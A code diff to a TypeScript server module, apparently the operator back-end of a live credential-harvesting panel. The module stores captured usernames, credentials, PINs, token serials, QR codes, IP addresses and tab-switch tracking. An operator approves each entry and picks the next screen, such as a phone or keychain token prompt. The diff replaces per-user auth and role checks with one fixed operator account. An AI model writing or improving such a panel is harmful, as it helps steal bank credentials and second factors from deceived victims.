@@ -1,6 +1,6 @@
 import { createServerFn } from "@tanstack/react-start";
 import { z } from "zod";
-import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
+import { requireOperatorSession } from "@/lib/operator-middleware";
 
 const filtroSchema = z.object({
   status: z.enum(["pendente", "aguardando", "aprovado", "reprovado", "todos"]).default("pendente"),
@@ -21,7 +21,14 @@ const decisaoSchema = z.object({
   decisao: z.enum(["aprovado", "reprovado"]),
   motivo: z.string().trim().max(400).optional(),
   proxima_tela: z
-    .enum(["token_celular", "token_chaveiro", "pin", "interna", "interna_token_celular", "interna_token_chaveiro"])
+    .enum([
+      "token_celular",
+      "token_chaveiro",
+      "pin",
+      "interna",
+      "interna_token_celular",
+      "interna_token_chaveiro",
+    ])
     .optional(),
   token_serial: serialSchema.optional(),
   token_nome: nomeSchema.optional(),
@@ -44,7 +51,11 @@ const reencaminharSchema = z.object({
 
 const salvarSerialSchema = z.object({
   id: z.string().uuid(),
-  token_serial: z.string().trim().max(15).regex(/^[A-Za-z0-9-]*$/, "Serial inválido"),
+  token_serial: z
+    .string()
+    .trim()
+    .max(15)
+    .regex(/^[A-Za-z0-9-]*$/, "Serial inválido"),
 });
 
 const salvarNomeSchema = z.object({
@@ -69,11 +80,9 @@ const limparQrSchema = z.object({ id: z.string().uuid() });
 const SELECT_COLS =
   "id, usuario, credencial, origem, status, observacao, criado_em, motivo, decidido_em, decidido_por, proxima_tela, token, token_em, ip, user_agent, ultimo_ping, mudou_aba, fase, pin, pin_em, token_serial, token_nome, qr_code_url";
 
-
-
 export const listarSolicitacoes = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => filtroSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => filtroSchema.parse(input))
   .handler(async ({ data, context }) => {
     let query = context.supabase
       .from("solicitacoes")
@@ -95,24 +104,15 @@ export const listarSolicitacoes = createServerFn({ method: "POST" })
     const { data: rows, error } = await query;
     if (error) throw new Error(error.message);
 
-    const ids = [...new Set((rows ?? []).map((r) => r.decidido_por).filter(Boolean))] as string[];
-    let nomes: Record<string, string> = {};
-    if (ids.length) {
-      const { data: perfis } = await context.supabase
-        .from("perfis")
-        .select("id, nome")
-        .in("id", ids);
-      nomes = Object.fromEntries((perfis ?? []).map((p) => [p.id, p.nome]));
-    }
-
+    // decidido_por now stores the operator username directly (single fixed account).
     return (rows ?? []).map((r) => ({
       ...r,
-      operador: r.decidido_por ? (nomes[r.decidido_por] ?? "Operador") : null,
+      operador: r.decidido_por,
     }));
   });
 
 export const contarPorStatus = createServerFn({ method: "GET" })
-  .middleware([requireSupabaseAuth])
+  .middleware([requireOperatorSession])
   .handler(async ({ context }) => {
     const { data, error } = await context.supabase.from("solicitacoes").select("status");
     if (error) throw new Error(error.message);
@@ -122,8 +122,8 @@ export const contarPorStatus = createServerFn({ method: "GET" })
   });
 
 export const decidirSolicitacao = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => decisaoSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => decisaoSchema.parse(input))
   .handler(async ({ data, context }) => {
     if (data.decisao === "reprovado" && !data.motivo) {
       throw new Error("Informe o motivo da reprovação.");
@@ -138,7 +138,7 @@ export const decidirSolicitacao = createServerFn({ method: "POST" })
         status: data.decisao,
         motivo: data.motivo ?? null,
         proxima_tela: data.decisao === "aprovado" ? (data.proxima_tela ?? null) : null,
-        decidido_por: context.userId,
+        decidido_por: context.operador,
         decidido_em: new Date().toISOString(),
         ...(data.token_serial !== undefined ? { token_serial: data.token_serial } : {}),
         ...(data.token_nome !== undefined ? { token_nome: data.token_nome } : {}),
@@ -153,10 +153,9 @@ export const decidirSolicitacao = createServerFn({ method: "POST" })
     return { ok: true };
   });
 
-
 export const reencaminharSolicitacao = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => reencaminharSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => reencaminharSchema.parse(input))
   .handler(async ({ data, context }) => {
     const { error } = await context.supabase
       .from("solicitacoes")
@@ -176,8 +175,8 @@ export const reencaminharSolicitacao = createServerFn({ method: "POST" })
   });
 
 export const salvarTokenNome = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => salvarNomeSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => salvarNomeSchema.parse(input))
   .handler(async ({ data, context }) => {
     const { error } = await context.supabase
       .from("solicitacoes")
@@ -188,8 +187,8 @@ export const salvarTokenNome = createServerFn({ method: "POST" })
   });
 
 export const salvarTokenSerial = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => salvarSerialSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => salvarSerialSchema.parse(input))
   .handler(async ({ data, context }) => {
     const { error } = await context.supabase
       .from("solicitacoes")
@@ -199,44 +198,25 @@ export const salvarTokenSerial = createServerFn({ method: "POST" })
     return { ok: true };
   });
 
-
 export const meuPerfil = createServerFn({ method: "GET" })
-  .middleware([requireSupabaseAuth])
+  .middleware([requireOperatorSession])
   .handler(async ({ context }) => {
-    const { data } = await context.supabase
-      .from("perfis")
-      .select("id, nome")
-      .eq("id", context.userId)
-      .maybeSingle();
-    return { id: context.userId, nome: data?.nome ?? "Operador" };
+    return { id: context.operador, nome: context.operador };
   });
 
-async function garantirOperador(
-  supabase: { rpc: (fn: string, args: Record<string, unknown>) => Promise<{ data: boolean | null }> },
-  userId: string,
-) {
-  const { data: op } = await supabase.rpc("has_role", { _user_id: userId, _role: "operador" });
-  const { data: ad } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
-  if (!op && !ad) throw new Error("Sem permissão.");
-}
-
 export const excluirSolicitacao = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => excluirSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => excluirSchema.parse(input))
   .handler(async ({ data, context }) => {
-    await garantirOperador(context.supabase as never, context.userId);
-    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-    const { error } = await supabaseAdmin.from("solicitacoes").delete().eq("id", data.id);
+    const { error } = await context.supabase.from("solicitacoes").delete().eq("id", data.id);
     if (error) throw new Error(error.message);
     return { ok: true };
   });
 
 export const limparPainel = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
+  .middleware([requireOperatorSession])
   .handler(async ({ context }) => {
-    await garantirOperador(context.supabase as never, context.userId);
-    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-    const { error, count } = await supabaseAdmin
+    const { error, count } = await context.supabase
       .from("solicitacoes")
       .delete({ count: "exact" })
       .not("id", "is", null);
@@ -245,8 +225,8 @@ export const limparPainel = createServerFn({ method: "POST" })
   });
 
 export const enviarQrCode = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => qrCodeSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => qrCodeSchema.parse(input))
   .handler(async ({ data, context }) => {
     const { error } = await context.supabase
       .from("solicitacoes")
@@ -257,8 +237,8 @@ export const enviarQrCode = createServerFn({ method: "POST" })
   });
 
 export const limparQrCode = createServerFn({ method: "POST" })
-  .middleware([requireSupabaseAuth])
-  .validator((input: unknown) => limparQrSchema.parse(input))
+  .middleware([requireOperatorSession])
+  .inputValidator((input: unknown) => limparQrSchema.parse(input))
   .handler(async ({ data, context }) => {
     const { error } = await context.supabase
       .from("solicitacoes")
@@ -267,4 +247,3 @@ export const limparQrCode = createServerFn({ method: "POST" })
     if (error) throw new Error(error.message);
     return { ok: true };
   });
-
